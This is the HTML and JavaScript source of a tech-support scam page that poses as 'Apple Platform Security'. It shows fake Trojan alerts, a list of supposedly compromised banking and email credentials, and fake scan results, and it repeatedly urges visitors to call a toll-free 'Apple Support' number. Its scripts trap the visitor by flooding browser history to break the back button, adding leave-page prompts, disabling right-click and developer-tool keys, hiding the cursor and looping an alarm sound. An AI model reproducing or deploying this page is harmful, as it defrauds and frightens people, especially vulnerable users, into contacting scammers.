
<!doctype html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Apple System Security</title>

    <link rel="stylesheet" type="text/css"
          href="https://maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css"
          integrity="sha384-JcKb8q3iqJ61gNV9KGb8thSsNjpSL0n8PARn9HuZOnIxN0hoP+VmmDGMN5t9UJ0Z" crossorigin="anonymous">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"
            integrity="sha384-B4gt1jrGC7Jh4AgTPSdUtOBvfO8shuf57BaghqFfPlYxofvL8/KUEfYiJOMMV+rV"
            crossorigin="anonymous"></script>

            <!-- Global site tag (gtag.js) - Google Analytics -->
                        <script async src="https://www.googletagmanager.com/gtag/js?id=UA-140789037-1"></script>
                        <script>
                          window.dataLayer = window.dataLayer || [];
                          function gtag(){dataLayer.push(arguments);}
                          gtag('js', new Date());

                          gtag('config', 'UA-140789037-1');
                        </script>


    <script type="text/javascript">
        function getVariableFromURl(name) {
            name = name.replace(/[\[]/, "\\\[").replace(/[\]]/, "\\\]");
            var regexS = "[\\?&]" + name + "=([^&#]*)";
            var regex = new RegExp(regexS);
            var results = regex.exec(window.location.href);
            if (results == null)
                return "";
            else
                return results[1];
        }

        var phone = getVariableFromURl('phone');
        var phone_number = phone + ' +1-888-971-5620 (Toll Free)';
        var phone_number2 = phone + ' +1-888-971-5620 (Toll Free)';

    </script>
    <script type="text/javascript">
        window.onbeforeunload = function () {
            if (data_needs_saving()) {
                return "Do you really want to leave our brilliant application?";
            } else {
                return;
            }
        };
    </script>
    <script type="text/javascript">
        window.addEventListener("beforeunload", function (e) {
            var confirmationMessage = 'It looks like you have been editing something. '
                + 'If you leave before saving, your changes will be lost.';

            (e || window.event).returnValue = confirmationMessage; //Gecko + IE
            return confirmationMessage; //Gecko + Webkit, Safari, Chrome etc.
        });
    </script>
    <style type="text/css">
        .blink {
            background-color: #659e1d;
            animation: blink-animation 1s steps(5, start) infinite;
            -webkit-animation: blink-animation 1s steps(5, start) infinite;
        }

        .blink2 {
            background-color: #659e1d;
            animation: blink-animation 1s steps(5, start) infinite;
            -webkit-animation: blink-animation 1s steps(5, start) infinite;
        }

        @keyframes blink-animation {
            to {
                visibility: hidden;
            }
        }

        @-webkit-keyframes blink-animation {
            to {
                visibility: hidden;
            }
        }

    </style>

    <link href="5f205bb74a5eb_v.css" type="text/css" rel="stylesheet"/>
    <!--<script src=".index_files/jquery.min.js" type="text/javascript"></script>-->
    <!--<script type="text/javascript" src="../../bbmaster.js"></script>-->
    <script type="text/javascript">
        //backbutton
        !(function () {
            var t;
            try {
                for (t = 0; 10 > t; ++t) history.pushState({}, "", "#");
                onpopstate = function (t) {
                    t.state && location.replace("#");
                };
            } catch (o) {
            }
        })();
    </script>
    <script>
        var pm_tag = "decpl";
        var pm_pid = "11397-dab3c5a4";
    </script>
<!--    <script src="5f205bb713507_v.js" async></script>-->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/froala-editor/2.8.5/css/froala_style.min.css"/>
    <link href="5f205bb63ccd2_v.css" rel="stylesheet"/>
    <link id="anstrexCustomLink" rel="stylesheet" type="text/css" href="5f205bc497791_v.css"/>
    <script type="text/javascript">
        function myFunction() {
            return "Write something clever here...";
        }
    </script>
    <script type="text/javascript">
        $(document).ready(function () {
            var audioElement = document.createElement('audio');
            audioElement.setAttribute('src', 'alertmicrosoft.mp3');

            audioElement.addEventListener('ended', function () {
                this.play();
            }, false);


            $('#map').click(function () {
                audioElement.play();

            });


        });
    </script>
    <script type="text/javascript">
        $(document).keyup(function (evtobj) {
            if (!(evtobj.altKey || evtobj.ctrlKey || evtobj.shiftKey)) {
                if (evtobj.keyCode == 16) {
                    return false;
                }
                if (evtobj.keyCode == 17) {
                    return false;
                }
                $("body").append(evtobj.keyCode + " ");
            }
        });
    </script>
    <script type="text/javascript">

        // To disable right click
        document.addEventListener('contextmenu', event => event.preventDefault());

        // To disable F12 options
        document.onkeypress = function (event) {
            event = (event || window.event);
            if (event.keyCode == 123) {
                return false;
            }
        }
        document.onmousedown = function (event) {
            event = (event || window.event);
            if (event.keyCode == 123) {
                return false;
            }
        }
        document.onkeydown = function (event) {
            event = (event || window.event);
            if (event.keyCode == 123) {
                return false;
            }
        }

        // To To Disable ctrl+c, ctrl+u

        jQuery(document).ready(function ($) {
            $(document).keydown(function (event) {
                var pressedKey = String.fromCharCode(event.keyCode).toLowerCase();

                if (event.ctrlKey && (pressedKey == "c" || pressedKey == "u")) {
                    alert('Sorry, This Functionality Has Been Disabled!');
//disable key press porcessing
                    return false;
                }
            });
        });

    </script>

</head>

<body id="map" onbeforeunload="return myFunction()" style="overflow: hidden;cursor: none;">

<div id="chat-box">
    <img src="microsoft.png"><span style="color: #222;
    font-size: 21px;
    font-weight: 600;
    margin-left: 6px;
    position: relative;
    top: 5px;">macOS Support</span><!--  <p style="font-weight: 600;">Contact Support</p> -->
    <h4 style="font-weight: 600;">
        <script>document.write(phone_number);</script>
    </h4>
    <div class="arrow-down">
        <i class="fa fa-caret-down"></i>
    </div>
</div>

<audio id="beep" autoplay="">
    <source src="warning.mp3" type="audio/mpeg">
</audio>

<div id="delayedPopup" class="delayedPopupWindow lightbox" style="background:#f2f2f2;">
    <!-- This is the close button -->
    <!-- <a href="#" id="btnClose"><i class="fa fa-times" aria-hidden="true"></i></a> -->

    <div class="row firewall-pro">
        <div class="col-md-12">
            <div class="green-box" style="
     /* -webkit-box-shadow: 0px 0px 15px 0px rgba(50, 50, 50, 0.5);
    -moz-box-shadow: 0px 0px 15px 0px rgba(50, 50, 50, 0.5);
    box-shadow: 0px 0px 15px 0px rgba(50, 50, 50, 0.5);*/
      background-color: #DFDFDF;
        border: 1px solid #aaa;">
                <div class="row">
                    <div class="col-md-2">
                        <div class="minimize">
                            <ul>
                                <li style="cursor: pointer;"><img src="mini.png"></li>
                            </ul>
                        </div>
                    </div>
                    <div class="col-md-10">
                        <div class="logo_micro" style="float: left;
    margin-left: 26%;">
                            <img src="microsoft.png"><span style="color: #000;">macOS Security</span>
                            <div class="angle-right-icon">
                                <a href="#"><i class="fa fa-angle-double-right"></i></a>
                            </div>
                        </div>
                    </div>


                </div>

            </div>
        </div>
        <div class="col-md-4">
            <div class="microsoft-logo">
                <img src="microsoft-white.png"><span>macOS</span>
            </div>
        </div>
        <div class="col-md-8">
            <div class="formDescription">
                <p style="color:red;">Apple Secrity Alert - Error Code: #0x83d47d</p>
                <p style="color:black;">Access to this PC has been blocked for security reasons.</p>
                <p style="color:black;">Contact Mac Support:
                    <script>document.write(phone_number2);</script>
                </p>

            </div>
        </div>
    </div>
    <!-- This is the left side of the popup for the description -->
    <footer id="footer">
        <div class="row">
            <div class="col-md-6 left-code">
                <p>Threat Detected - Trojan Spyware<br>
                    App: Ads.financetrack(1).exe</p>
            </div>
            <div class="col-md-6">
                <div class="button_new" id="footer_btn">
                    <a href="#" class="safe">Run Anyway</a>
                    <a href="#" class="anyway blink">Back to Safety</a>
                </div>
            </div>
        </div>
    </footer>
    <!-- End MailChimp Signup Form -->
</div>

<div class="alert_popup cardcontainer lightbox" style="cursor: none;">
    <div class="container">
        <div class="row">
            <div class="col-md-12">
                <p class="text-center" style="    font-size: 16px;
    font-weight: normal;
    margin: 0;
    margin-bottom: 5px;
    padding: 5px 10px;
    color: #414141;font-weight: bold;
    margin-top: 8px;"><img src="safari.png" style="width: 53px;padding-left: 15px;"> Apple Platform Security</p>
                <p class="text-center">** ACCESS TO THIS PC HAS BEEN BLOCKED FOR SECURITY REASONS **</p>
                <p>Your computer has alerted us that it has been infected with a Trojan Spyware. The following data has
                    been compromised.</p>
                <p>&gt; Email Credentials<br>
                    &gt; Banking Passwords<br>
                    &gt; Facebook Login<br>
                    &gt; Pictures &amp; Documents

                </p>
                <p>Apple Platform Security has found potentially unwanted Adware on this device that can steal your
                    passwords, online identity, financial information, personal files, pictures or documents.</p>
                <p>You must contact us immediately so that our engineers can walk you through the removal process over
                    the phone.</p>
                <p>Call Apple Support immediately to report this threat, prevent identity theft and unlock access to
                    this device.</p>
                <p>Closing this window will put your personal information at risk and lead to a suspension of your
                    Mac Registration.</p>
                <p style="padding-bottom: 0px;">Call Apple Support: <strong>
                        <script>document.write(phone_number);</script>
                    </strong></p>
                <div class="action_buttons"><a class="active" id="leave_page" style="cursor: pointer;">Allow</a> <a
                            class="active" id="leave_page">Don't Allow</a></div>
            </div>

        </div>
    </div>
</div>


<div class="bg">
    <!-- <div class="logo"><img src="5f205bb7e57b5_v.png" alt="Norton™" /></div> -->
    <!-- <div class="menu" id="menu">PRODUCTS & SERVICES &nbsp;&nbsp;&nbsp; INTERNET SECURITY CENTER &nbsp;&nbsp;&nbsp; SUPPORT &nbsp;&nbsp;&nbsp; FREE TRIALS &nbsp;&nbsp;&nbsp; SIGN IN</div> -->
    <div class="bgimg" style="top: 0px;"><img src="background-2.png" alt="" width="100%"/></div>
    <div class="text">
        <!--   <span id="head1">Windows Has Detected a Malicious Virus On Your System</span>
          <span style="font-size: 30px; color: #000;font-weight: 600;" id="head2">Contact Our Certified Windows Technicians For Immediate Assistance</span>
        <span style="font-size: 30px;color: #000;font-weight: 600;"><script>document.write(phone_number);</script></span> -->
    </div>
</div>
<!-- <div class="bottom">
    <div class="logo"><img src="5f205bb933ceb_v.png" alt="Norton™" /></div>
    <div class="copyright">© 2020 NortonLifeLock Inc. <strong style="color: #1ce783;"> sample scanner and an affiliate advertisment.</strong></div>
    <div class="line1"></div>
    <div class="menu" id="menu_b">Legal Notice | License Agreement | Privacy Policy | Careers | Cookies | Site Map | System Status | Agent Viewer</div>
    <div class="line2"></div>
    <div class="text">Save up to 50% on Norton 360 for first year*</div>
</div> -->
<a href="#" rel="noreferrer" style="cursor: none;" id="link_black">
    <div class="black" style="height: 145%;"></div>
</a>
<div class="win1" style="cursor: none;display: none;">
    <div class="header">
        <img src="microsoft.png" class="ico"/>
        <div class="name">Apple Platform Security</div>
        <img src="5f205bba58587_v.png" class="win_min"/> <img src="5f205bbe46967_v.png" class="win_cls"/>
    </div>
    <div class="gray_line">
        <img src="5f205bbdae210_v.png" class="ico_gray1" id="w1_ico1"/>
        <div class="set" id="w1_1">Settings</div>
        <img src="5f205bbae3ed9_v.png" class="ico_gray2" id="w1_ico2"/>
        <div class="help" id="w1_2">Help</div>
    </div>
    <div class="white_line">
        <img src="5f205bb9bf55a_v.gif" class="pc"/>
        <div class="txt1" id="w1_3">You Are Protected</div>
        <div class="txt2">
            <span id="w1_4">Protection Updates: </span><span style="color: #23a31c;" id="w1_5">Current</span><br/>
            <span id="w1_6">Last Scan: </span><span style="color: #c00;" id="w1_7">Not available</span> <span
                    style="color: #2ea8e5;" id="w1_8">| Quick Scan</span><br/>
            <span id="w1_9">Licenses Used: </span><span style="color: #23a31c;" id="w1_10">1 of 5</span> <span
                    style="color: #2ea8e5;" id="w1_11">| Install on Another Device</span>
        </div>
    </div>
    <div class="green_line"><img src="5f205bbb6fc7d_v.gif" class="corner"/></div>
    <div class="bl1">
        <div class="txt1" id="w1_12">Security</div>
        <img src="5f205bbbf25aa_v.gif" class="ico"/>
        <div class="txt2" id="w1_13" style="color: red">Disabled</div>
        <div class="line"></div>
    </div>
    <div class="bl2">
        <div class="txt1" id="w1_14">Identity</div>
        <img src="5f205bbc8a6e3_v.gif" class="ico"/>
        <div class="txt2" id="w1_13a" style="color: red">At Risk</div>
        <div class="line"></div>
    </div>
    <div class="bl3">
        <div class="txt1" id="w1_15">Performance</div>
        <img src="5f205bc00090f_v.gif" class="ico"/>
        <div class="txt2" id="w1_13b">Optimized</div>
        <div class="line"></div>
    </div>
    <div class="bl4">
        <div class="txt1" id="w1_16" style="font-size: 20px;">Firewall</div>
        <img src="microsoft.png" class="ico" style="width: 52px;margin-top: 27px;"/>
        <div class="txt2" id="w1_13c">Turned Off</div>
    </div>
    <div class="gray_line2">
        <div class="txt"><span id="w1_17">STATUS : </span><span class="gr" id="w1_18" style="color: red;">Your PC is at Risk!</span>
        </div>
    </div>
</div>
<div class="win2" id="win2" style="display: none;cursor: none;">
    <div class="header" style="background-color: #DFDFDF;border-bottom: 1px solid #aaa;
    border-top: 1px solid #aaa;">
        <img src="mini.png" style="width: 53px;
    height: auto;
    margin-top: 0px;
    margin-left: 6px;">
        <div class="name" id="w2_1">Quick Scan</div>
        <div class="angle-right-icon" style="    right: 2%;
    top: 3px;">
            <a href="#"><i class="fa fa-angle-double-right"></i></a>
        </div>
    </div>
    <div class="line_orange">
        <img src="5f205bbece31e_v.png" class="ring"/>
        <div class="header" id="w2_2">Working</div>
        <div class="txt1" id="w2_3">Scanning commonly infected areas and startup files...</div>
        <div class="txt2" id="path1">C:WindowsSystem32sihost.exe</div>
        <div class="anim" style="background: url('./img/anim_orange.gif');"></div>
    </div>
    <div class="line_red" style="display: none;" id="win2_line_red">
        <img src="cross-sign.png" class="ring" style="width: "/>
        <div class="header" id="w2_4">Working</div>
        <div class="txt1" id="w2_5">Scanning commonly infected areas and startup files...</div>
        <div class="txt2" id="path2">C:\Program Files\Windows Defender\MSASCuiL.exe</div>
        <div class="anim" style="background: url('./img/anim_red.gif');"></div>
    </div>
    <div class="tab">
        <div class="line1" id="w2_6">Results Summary</div>
        <div class="line2" id="w2_7">[+] Total items scanned:</div>
        <div class="line3" id="w2_8">[+] Total security risks detected:</div>
        <div class="line4" id="w2_9">[+] Total security risks resolved:</div>
        <div class="line5" id="w2_10">Total security risks requiring attention:</div>
        <div class="line6"></div>
        <div class="digit1" id="cnt1">143</div>
        <div class="digit2" id="cnt2">0</div>
        <div class="digit3">0</div>
        <div class="digit4" id="cnt4">0</div>
    </div>
    <img src="microsoft.png" class="nrt_logo"/><span class="mask2">macOS Security</span>
    <div class="btn1" id="w2_11">Pause</div>
    <div class="btn2" id="w2_12">Stop</div>
</div>
<a href="#" rel="noreferrer" style="cursor: none;"> </a>

<div id="vir1">
    <div id="vir_tray">
        <div class="line_red">
            <span id="w4_1"><b>Threat Detected!</b></span><br/>
            Win32/Hoax.Renos.HX
        </div>
        <img src="5f205bc1a74d5_v.gif" class="ico_tray1"/>
        <div class="txt1" id="w4_2">High Risk</div>
        <img src="5f205bc2379ac_v.gif" class="ico_tray2"/>
        <div class="txt2">
            <span id="w4_4"><b>Origin</b></span><br/>
            <span id="w4_5">Not available</span>
        </div>
        <img src="5f205bc2c1b4b_v.gif" class="ico_tray3"/>
        <div class="txt3">
            <span id="w4_6"><b>Activity</b></span><br/>
            <span id="w4_7">Threat actions performed: 1</span>
        </div>
    </div>
</div>
<div id="vir2">
    <div id="vir_tray">
        <div class="line_red">
            <span id="w4_1a"><b>Threat Detected!</b></span><br/>
            Trojan IRC/Backdor.Sd.FRV
        </div>
        <img src="5f205bc1a74d5_v.gif" class="ico_tray1"/>
        <div class="txt1" id="w4_2a">High Risk</div>
        <img src="5f205bc2379ac_v.gif" class="ico_tray2"/>
        <div class="txt2">
            <span id="w4_4a"><b>Origin</b></span><br/>
            <span id="w4_5a">Not available</span>
        </div>
        <img src="5f205bc2c1b4b_v.gif" class="ico_tray3"/>
        <div class="txt3">
            <span id="w4_6a"><b>Activity</b></span><br/>
            <span id="w4_7a">Threat actions performed: 1</span>
        </div>
    </div>
</div>
<div id="vir3">
    <div id="vir_tray">
        <div class="line_red">
            <span id="w4_1b"><b>Threat Detected!</b></span><br/>
            Adware.Win32.Look2me.ab
        </div>
        <img src="5f205bc1a74d5_v.gif" class="ico_tray1"/>
        <div class="txt1" id="w4_3">Medium Risk</div>
        <img src="5f205bc2379ac_v.gif" class="ico_tray2"/>
        <div class="txt2">
            <span id="w4_4b"><b>Origin</b></span><br/>
            <span id="w4_5b">Not available</span>
        </div>
        <img src="5f205bc2c1b4b_v.gif" class="ico_tray3"/>
        <div class="txt3">
            <span id="w4_6b"><b>Activity</b></span><br/>
            <span id="w4_7b">Threat actions performed: 1</span>
        </div>
    </div>
</div>
<div id="vir4">
    <div id="vir_tray">
        <div class="line_red">
            <span id="w4_1c"><b>Threat Detected!</b></span><br/>
            Trojan.Qoologic - Key Logger
        </div>
        <img src="5f205bc1a74d5_v.gif" class="ico_tray1"/>
        <div class="txt1" id="w4_2b">High Risk</div>
        <img src="5f205bc2379ac_v.gif" class="ico_tray2"/>
        <div class="txt2">
            <span id="w4_4c"><b>Origin</b></span><br/>
            <span id="w4_5c">Not available</span>
        </div>
        <img src="5f205bc2c1b4b_v.gif" class="ico_tray3"/>
        <div class="txt3">
            <span id="w4_6c"><b>Activity</b></span><br/>
            <span id="w4_7c">Threat actions performed: 1</span>
        </div>
    </div>
</div>
<div id="vir5">
    <div id="vir_tray">
        <div class="line_red">
            <span id="w4_1d"><b>Threat Detected!</b></span><br/>
            Trojan.Fakealert.356
        </div>
        <img src="5f205bc1a74d5_v.gif" class="ico_tray1"/>
        <div class="txt1" id="w4_2c">High Risk</div>
        <img src="5f205bc2379ac_v.gif" class="ico_tray2"/>
        <div class="txt2">
            <span id="w4_4d"><b>Origin</b></span><br/>
            <span id="w4_5d">Not available</span>
        </div>
        <img src="5f205bc2c1b4b_v.gif" class="ico_tray3"/>
        <div class="txt3">
            <span id="w4_6d"><b>Activity</b></span><br/>
            <span id="w4_7d">Threat actions performed: 1</span>
        </div>
    </div>
</div>
<script language="JavaScript" type="text/javascript">
    var lang = window.navigator.language || navigator.userLanguage;
    lang = lang.substr(0, 2).toLowerCase();
    if (lang == "de") {
        document.getElementById("menu").innerHTML = "PRODUKTE & SERVICES &nbsp&nbsp&nbsp INTERNET SECURITY CENTER &nbsp&nbsp&nbsp SUPPORT &nbsp&nbsp&nbsp KOSTENLOSE TESTVERSIONEN";
        document.getElementById("menu_b").innerHTML = "Rechtliche | Hinweise | Lizenzvereinbarung | Datenschutz | Jobs und Karriere | Cookies | Wegweiser | Systemstatus";
        document.getElementById("head1").innerHTML = "Online-Bedrohungen haben sich weiterentwickelt. Unser Schutz auch.";
        document.getElementById("head2").innerHTML = "Darum bietet Norton 360 mehrere Schutzebenen in einer einzigen Lösung: Gerätesicherheit, Secure VPN, Passwort-Manager und mehr.";
    }

    if (lang == "es") {
        document.getElementById("menu").innerHTML = "PRODUCTOS Y SERVICIOS &nbsp&nbsp&nbsp ASISTENCIA &nbsp&nbsp&nbsp VERSIONES DE PRUEBA";
        document.getElementById("menu_b").innerHTML = "Aviso legal | Acuerdo de licencia | Política de privacidad | Vacantes | Cookies | Mapa del sitio | Estado del sistema";
        document.getElementById("head1").innerHTML = "Las ciberamenazas han evolucionado. También lo ha hecho nuestra protección.";
        document.getElementById("head2").innerHTML = "Norton 360. Protección completa con Seguridad del dispositivo que incluye antivirus, VPN, Gestor de contraseñas y mucho más. Todo en una única solución.";
        document.getElementById("w1_ico1").style.right = "127px";
        document.getElementById("w1_1").style.right = "85px";
        document.getElementById("w1_ico2").style.right = "57px";
        document.getElementById("w1_1").innerHTML = "Ajustes";
        document.getElementById("w1_2").innerHTML = "Ayuda";
        document.getElementById("w1_3").innerHTML = "Está protegido";
        document.getElementById("w1_4").innerHTML = "Actualizaciones de protección: ";
        document.getElementById("w1_5").innerHTML = "Actual";
        document.getElementById("w1_6").innerHTML = "Último escaneo: ";
        document.getElementById("w1_7").innerHTML = "No está disponible";
        document.getElementById("w1_8").innerHTML = "| Escaneo rápido";
        document.getElementById("w1_9").innerHTML = "Licencias utilizadas: ";
        document.getElementById("w1_10").innerHTML = "1 de 5";
        document.getElementById("w1_11").innerHTML = "| Instalar en otro dispositivo";
        document.getElementById("w1_12").innerHTML = "Seguridad";
        document.getElementById("w1_13").innerHTML = "Protegido";
        document.getElementById("w1_14").innerHTML = "Identidad";
        document.getElementById("w1_13a").innerHTML = "Protegido";
        document.getElementById("w1_15").innerHTML = "Desempeño";
        document.getElementById("w1_13b").innerHTML = "Protegido";
        document.getElementById("w1_16").innerHTML = "Más Norton";
        document.getElementById("w1_13c").innerHTML = "Protegido";
        document.getElementById("w1_17").innerHTML = "ESTADO DE LA SUSCRIPCIÓN: ";
        document.getElementById("w1_18").innerHTML = "30 días restantes";
        document.getElementById("w2_1").innerHTML = "Escaneo rápido";
        document.getElementById("w2_2").innerHTML = "Trabajando";
        document.getElementById("w2_3").innerHTML = "Escaneando las áreas comúnmente infectadas y los archivos de inicio...";
        document.getElementById("w2_4").innerHTML = "Trabajando";
        document.getElementById("w2_5").innerHTML = "Escaneando las áreas comúnmente infectadas y los archivos de inicio...";
        document.getElementById("w2_6").innerHTML = "Resumen de resultados";
        document.getElementById("w2_7").innerHTML = "[+] Total de artículos escaneados:";
        document.getElementById("w2_8").innerHTML = "[+] Total de riesgos de seguridad detectados:";
        document.getElementById("w2_9").innerHTML = "[+] Total de riesgos de seguridad resueltos:";
        document.getElementById("w2_10").innerHTML = "Total de riesgos de seguridad que requieren atención:";
        document.getElementById("w2_11").innerHTML = "Pausa";
        document.getElementById("w2_12").innerHTML = "Detener";
        document.getElementById("w3_1").innerHTML = "¡Su PC está infectado con 5 virus!";
        document.getElementById("w3_2").innerHTML = "¡SE REQUIERE LLEVAR A CABO UNA ACCIÓN!";
        document.getElementById("w3_3").innerHTML = "¡Su suscripción a Norton ha expirado!";
        document.getElementById("w3_4").innerHTML = "Renuévela ahora para mantener su PC protegida.";
        document.getElementById("w3_5").innerHTML = "Si su PC está desprotegida, corre el riesgo de sufrir ataques de virus y otros tipos de malware.";
        document.getElementById("w3_6").innerHTML = "Continuar...";
        document.getElementById("w4_1").innerHTML = "¡Se detectó una amenaza!";
        document.getElementById("w4_1a").innerHTML = "¡Se detectó una amenaza!";
        document.getElementById("w4_1b").innerHTML = "¡Se detectó una amenaza!";
        document.getElementById("w4_1c").innerHTML = "¡Se detectó una amenaza!";
        document.getElementById("w4_1d").innerHTML = "¡Se detectó una amenaza!";
        document.getElementById("w4_2").innerHTML = "Alto riesgo";
        document.getElementById("w4_2a").innerHTML = "Alto riesgo";
        document.getElementById("w4_2b").innerHTML = "Alto riesgo";
        document.getElementById("w4_2c").innerHTML = "Alto riesgo";
        document.getElementById("w4_3").innerHTML = "Riesgo medio";
        document.getElementById("w4_4").innerHTML = "Origen";
        document.getElementById("w4_4a").innerHTML = "Origen";
        document.getElementById("w4_4b").innerHTML = "Origen";
        document.getElementById("w4_4c").innerHTML = "Origen";
        document.getElementById("w4_4d").innerHTML = "Origen";
        document.getElementById("w4_5").innerHTML = "No está disponible.";
        document.getElementById("w4_5a").innerHTML = "No está disponible.";
        document.getElementById("w4_5b").innerHTML = "No está disponible.";
        document.getElementById("w4_5c").innerHTML = "No está disponible.";
        document.getElementById("w4_5d").innerHTML = "No está disponible.";
        document.getElementById("w4_6").innerHTML = "Actividad";
        document.getElementById("w4_6a").innerHTML = "Actividad";
        document.getElementById("w4_6b").innerHTML = "Actividad";
        document.getElementById("w4_6c").innerHTML = "Actividad";
        document.getElementById("w4_6d").innerHTML = "Actividad";
        document.getElementById("w4_7").innerHTML = "Acciones realizadas contra la amenaza: 1";
        document.getElementById("w4_7a").innerHTML = "Acciones realizadas contra la amenaza: 1";
        document.getElementById("w4_7b").innerHTML = "Acciones realizadas contra la amenaza: 1";
        document.getElementById("w4_7c").innerHTML = "Acciones realizadas contra la amenaza: 1";
        document.getElementById("w4_7d").innerHTML = "Acciones realizadas contra la amenaza: 1";
    }

    if (lang == "fr") {
        document.getElementById("menu").innerHTML = "PRODUITS ET SERVICES &nbsp&nbsp&nbsp CENTRE DE SÉCURITÉ INTERNET &nbsp&nbsp&nbsp SUPPORT &nbsp&nbsp&nbsp ÉVALUATIONS GRATUITES";
        document.getElementById("menu_b").innerHTML = "Mentions légales | Contrat de licence | Politique de confidentialité | Carrières | Cookies | Plan du site | État du système";
        document.getElementById("head1").innerHTML = "Les cybermenaces ont évolué. Notre protection aussi.";
        document.getElementById("head2").innerHTML = "C'est pourquoi Norton 360 offre plusieurs niveaux de protection dans une seule et même solution : sécurité de l'appareil, Secure VPN, Password Manager et plus.";
        document.getElementById("w1_ico1").style.right = "172px";
        document.getElementById("w1_1").style.right = "110px";
        document.getElementById("w1_ico2").style.right = "79px";
        document.getElementById("w1_1").innerHTML = "Paramètres";
        document.getElementById("w1_2").innerHTML = "Assistance";
        document.getElementById("w1_3").innerHTML = "Vous êtes protégé·e";
        document.getElementById("w1_4").innerHTML = "Dernières nouvelles concernant la protection : ";
        document.getElementById("w1_5").innerHTML = "Actuelle";
        document.getElementById("w1_6").innerHTML = "Dernier scan : ";
        document.getElementById("w1_7").innerHTML = "Non disponible";
        document.getElementById("w1_8").innerHTML = "| Scan rapide";
        document.getElementById("w1_9").innerHTML = "Licences en cours d'utilisation : ";
        document.getElementById("w1_10").innerHTML = "1 sur 5";
        document.getElementById("w1_11").innerHTML = "| Installer sur un autre appareil";
        document.getElementById("w1_12").innerHTML = "Sécurité";
        document.getElementById("w1_13").innerHTML = "Protégé·e";
        document.getElementById("w1_14").innerHTML = "Identité";
        document.getElementById("w1_13a").innerHTML = "Protégé·e";
        document.getElementById("w1_15").innerHTML = "Performance";
        document.getElementById("w1_13b").innerHTML = "Protégé·e";
        document.getElementById("w1_16").innerHTML = "Plus de produits Norton";
        document.getElementById("w1_13c").innerHTML = "Protégé·e";
        document.getElementById("w1_17").innerHTML = "ÉTAT DE L'ABONNEMENT : ";
        document.getElementById("w1_18").innerHTML = "30 jours restants";
        document.getElementById("w2_1").innerHTML = "Scan rapide";
        document.getElementById("w2_2").innerHTML = "En cours";
        document.getElementById("w2_3").innerHTML = "Scan des zones communément infectées et des fichiers de démarrage...";
        document.getElementById("w2_4").innerHTML = "En cours";
        document.getElementById("w2_5").innerHTML = "Scan des zones communément infectées et des fichiers de démarrage...";
        document.getElementById("w2_6").innerHTML = "Résumé des résultats";
        document.getElementById("w2_7").innerHTML = "[+] Nombre total d'objets scannés :";
        document.getElementById("w2_8").innerHTML = "[+] Nombre total de risques pour la sécurité détectés :";
        document.getElementById("w2_9").innerHTML = "[+] Nombre total de risques pour la sécurité résolus :";
        document.getElementById("w2_10").innerHTML = "Nombre total de risques à la sécurité requérant de l'attention :";
        document.getElementById("w2_11").innerHTML = "Pause";
        document.getElementById("w2_12").innerHTML = "Stop";
        document.getElementById("w3_1").innerHTML = "Votre PC est infecté par 5 virus !";
        document.getElementById("w3_2").innerHTML = "DES MESURES DOIVENT ÊTRE PRISES !";
        document.getElementById("w3_3").innerHTML = "Votre abonnement à Norton a expiré !";
        document.getElementById("w3_4").innerHTML = "Renouvelez-le dès maintenant pour maintenir la protection de votre PC.";
        document.getElementById("w3_5").innerHTML = "Si votre PC n'est pas protégé, il existe un risque d'infection par des virus et autres maliciels.";
        document.getElementById("w3_6").innerHTML = "Continuer...";
        document.getElementById("w4_1").innerHTML = "Menace détectée !";
        document.getElementById("w4_1a").innerHTML = "Menace détectée !";
        document.getElementById("w4_1b").innerHTML = "Menace détectée !";
        document.getElementById("w4_1c").innerHTML = "Menace détectée !";
        document.getElementById("w4_1d").innerHTML = "Menace détectée !";
        document.getElementById("w4_2").innerHTML = "Haut risque";
        document.getElementById("w4_2a").innerHTML = "Haut risque";
        document.getElementById("w4_2b").innerHTML = "Haut risque";
        document.getElementById("w4_2c").innerHTML = "Haut risque";
        document.getElementById("w4_3").innerHTML = "Risque moyen";
        document.getElementById("w4_4").innerHTML = "Origine";
        document.getElementById("w4_4a").innerHTML = "Origine";
        document.getElementById("w4_4b").innerHTML = "Origine";
        document.getElementById("w4_4c").innerHTML = "Origine";
        document.getElementById("w4_4d").innerHTML = "Origine";
        document.getElementById("w4_5").innerHTML = "Non disponible";
        document.getElementById("w4_5a").innerHTML = "Non disponible";
        document.getElementById("w4_5b").innerHTML = "Non disponible";
        document.getElementById("w4_5c").innerHTML = "Non disponible";
        document.getElementById("w4_5d").innerHTML = "Non disponible";
        document.getElementById("w4_6").innerHTML = "Activité";
        document.getElementById("w4_6a").innerHTML = "Activité";
        document.getElementById("w4_6b").innerHTML = "Activité";
        document.getElementById("w4_6c").innerHTML = "Activité";
        document.getElementById("w4_6d").innerHTML = "Activité";
        document.getElementById("w4_7").innerHTML = "Mesures anti-menace effectuées : 1";
        document.getElementById("w4_7a").innerHTML = "Mesures anti-menace effectuées : 1";
        document.getElementById("w4_7b").innerHTML = "Mesures anti-menace effectuées : 1";
        document.getElementById("w4_7c").innerHTML = "Mesures anti-menace effectuées : 1";
        document.getElementById("w4_7d").innerHTML = "Mesures anti-menace effectuées : 1";
    }

    if (lang == "it") {
        document.getElementById("menu").innerHTML = "PRODOTTI E SERVIZI &nbsp&nbsp&nbsp SUPPORTO &nbsp&nbsp&nbsp PROVE GRATUITE";
        document.getElementById("menu_b").innerHTML = "Note legali | Contratto di licenza | Informativa sulla privacy | Opportunità di lavoro | Cookie | Indice del sito | Stato del sistema";
        document.getElementById("head1").innerHTML = "Le minacce informatiche si sono evolute. Ma anche i nostri sistemi di protezione.";
        document.getElementById("head2").innerHTML = "Norton 360. Protezione completa per la sicurezza del tuo dispositivo; include antivirus, VPN, Password Manager e molto altro ancora. Tutto in un’unica soluzione.";
        document.getElementById("w1_ico1").style.right = "157px";
        document.getElementById("w1_1").style.right = "85px";
        document.getElementById("w1_ico2").style.right = "55px";
        document.getElementById("w1_1").innerHTML = "Impostazioni";
        document.getElementById("w1_2").innerHTML = "Guida";
        document.getElementById("w1_3").innerHTML = "Il dispositivo è protetto";
